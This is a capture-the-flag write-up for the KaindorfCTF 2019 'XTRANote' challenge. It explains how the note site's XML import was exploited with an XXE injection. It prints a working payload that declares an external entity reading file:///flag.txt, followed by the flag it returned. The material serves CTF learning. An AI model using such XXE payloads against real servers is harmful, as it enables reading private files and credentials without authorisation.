# \[2019] XTRANote

## Introduction

"XTRANote" is a challenge in KaindorfCTF 2019 that provides you with a website for managing notes. There is also the functionality to import and export the notes as `.xml` files. The description of the challenge informed me about the flag that is sorted in `/flag.txt`.

![](<.gitbook/assets/image (8).png>)

## Approach

Besides the fact that the website also lacks XSS protection, the most suspicious part it the XML-Import. I created a note and downloaded it as following file afterwards:

```xml
<?xml version="1.0"?>
<noteexport>
	<title>My First Note</title>
	<note>Hey, this is my first note!</note>
</noteexport>
```

Since it is the most easiest approach, I tried to use a XXE (External XML Entity) Injection. In order to do this, I had to modify the payload in the following way:

```xml
<?xml version="1.0"?>
<!DOCTYPE replace [<!ENTITY flag SYSTEM "file:///flag.txt"> ]>
<noteexport>
    <title>Flag</title>
    <note>&flag;</note>
</noteexport>
```

This actually worked and revealed following flag to me:

```
KDCTF{XXE_1n_XTRANote_1337_y0}
```

![](<.gitbook/assets/image (7).png>)

> c0de$t3rn, 2024
